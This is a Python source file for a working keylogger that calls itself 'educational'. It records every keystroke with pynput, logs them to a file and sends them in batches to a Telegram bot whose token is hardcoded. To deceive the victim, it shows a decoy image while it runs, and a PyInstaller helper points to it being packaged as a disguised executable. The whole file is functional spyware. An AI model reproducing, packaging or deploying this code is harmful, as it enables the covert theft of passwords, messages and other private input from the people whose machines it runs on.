import pynput.keyboard
import requests
import os
import time
from PIL import Image
import sys
import logging

# Set up logging
logging.basicConfig(level=logging.ERROR)

class TelegramKeylogger:
    def __init__(self, telegram_bot_token, telegram_chat_id, local_file="keystrokes.txt"):
        self.log = ""
        self.local_file = os.path.abspath(local_file)  # Convert to absolute path
        self.telegram_bot_token = telegram_bot_token
        self.telegram_chat_id = telegram_chat_id
        
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(self.local_file), exist_ok=True)
        
        # Create local file if it doesn't exist
        try:
            with open(self.local_file, 'a') as f:
                pass
            print(f"Log file created at: {self.local_file}")
        except Exception as e:
            logging.error(f"Failed to create local file: {e}")
            # Fallback to a simpler path if the original fails
            self.local_file = os.path.join(os.getcwd(), "keystrokes.txt")
            with open(self.local_file, 'a') as f:
                pass
            print(f"Using fallback log file at: {self.local_file}")

    def save_to_local_file(self, data):
        """Save keystrokes to a local file"""
        try:
            with open(self.local_file, 'a', encoding='utf-8') as f:
                f.write(data)
        except Exception as e:
            logging.error(f"Error saving to local file: {e}")

    def send_to_telegram(self, message):
        """Send keystrokes to Telegram bot"""
        try:
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {
                "chat_id": self.telegram_chat_id,
                "text": message
            }
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                return True
            else:
                logging.error(f"Telegram API error: {response.text}")
                return False
        except Exception as e:
            logging.error(f"Error sending to Telegram: {e}")
            return False

    def append_to_log(self, key_strike):
        self.log += key_strike
        
        # Save to local file
        self.save_to_local_file(key_strike)
        
        # Send to Telegram if we have enough data (to avoid too many API calls)
        if len(self.log) >= 15:  # Send every 15 characters
            if self.send_to_telegram(self.log):
                self.log = ""  # Clear log if successfully sent

    def evaluate_keys(self, key):
        try:
            key_str = str(key.char)
        except AttributeError:
            if key == key.space:
                key_str = " "
            elif key == key.enter:
                key_str = "\n"
            elif key == key.tab:
                key_str = "\t"
            else:
                key_str = f" [{key}] "
        self.append_to_log(key_str)

    def start(self):
        # Send startup message to Telegram
        self.send_to_telegram("üîê Educational Keylogger Started - For research purposes only")
        
        # Start the keylogger
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            keyboard_listener.join()

def show_image(image_path):
    """Open the harmless image so the user sees it"""
    try:
        if os.path.exists(image_path):
            img = Image.open(image_path)
            img.show()
            print("Showing decoy image...")
        else:
            print(f"Image not found: {image_path}")
    except Exception as e:
        print(f"Error showing image: {e}")

def resource_path(relative_path):
    """Get absolute path to resource, works in dev and PyInstaller exe"""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def get_chat_id(bot_token):
    """Get chat ID by checking for new messages"""
    print("Please send a message to your bot now...")
    print("Waiting for message... (60 seconds max)")
    
    # Check for messages every 5 seconds
    for i in range(12):  # Wait up to 60 seconds
        try:
            response = requests.get(f'https://api.telegram.org/bot{bot_token}/getUpdates', timeout=10)
            data = response.json()
            
            if data["ok"] and data["result"]:
                # Get the latest message
                latest_update = data["result"][-1]
                chat_id = latest_update["message"]["chat"]["id"]
                print(f"\nMessage received! Your chat ID is: {chat_id}")
                return chat_id
                
        except Exception as e:
            print(f"Error: {e}")
            
        time.sleep(5)  # Wait 5 seconds before checking again
        print(".", end="", flush=True)
    
    return None

def test_telegram_connection(bot_token, chat_id):
    """Test if we can connect to Telegram API"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/getMe"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print("‚úì Successfully connected to Telegram API")
            
            # Test sending a message
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": "‚úÖ Educational Keylogger connection test successful!"
            }
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                print("‚úì Test message sent successfully")
                return True
            else:
                print(f"‚úó Failed to send test message: {response.text}")
                return False
        else:
            print(f"‚úó Failed to connect to Telegram API: {response.text}")
            return False
    except Exception as e:
        print(f"‚úó Error testing Telegram connection: {e}")
        return False

if __name__ == "__main__":
    print("Educational Keylogger - For Research Purposes Only")
    print("=" * 50)
    
    # Telegram configuration
    telegram_bot_token = "8430358401:AAHCAobBoUxL-Fi-hjJ2MMSBpbrUkTxxT1I"
    
    # Get chat ID automatically
    telegram_chat_id = get_chat_id(telegram_bot_token)
    if not telegram_chat_id:
        print("\nFailed to get chat ID. Please make sure you've sent a message to your bot.")
        exit(1)
    
    # Test Telegram connection first
    if not test_telegram_connection(telegram_bot_token, telegram_chat_id):
        print("Please check your bot token and try again.")
        exit(1)
    
    # Image path
    image_path = resource_path(r'C:\Users\Lenovo\Desktop\Folders\My_Basic_To_Advanced_Python_Projects\Malware_Scripts\hack.jpg')
    
    # Show the harmless image
    show_image(image_path)
    
    # Start the keylogger
    print("Keylogger started (educational purposes only)...")
    
    # Use a simple filename in the current directory to avoid path issues
    keylogger = TelegramKeylogger(telegram_bot_token, telegram_chat_id, r'C:\Users\Lenovo\Desktop\Folders\My_Basic_To_Advanced_Python_Projects\Malware_Scripts\keystrokes_log.txt')
    keylogger.start()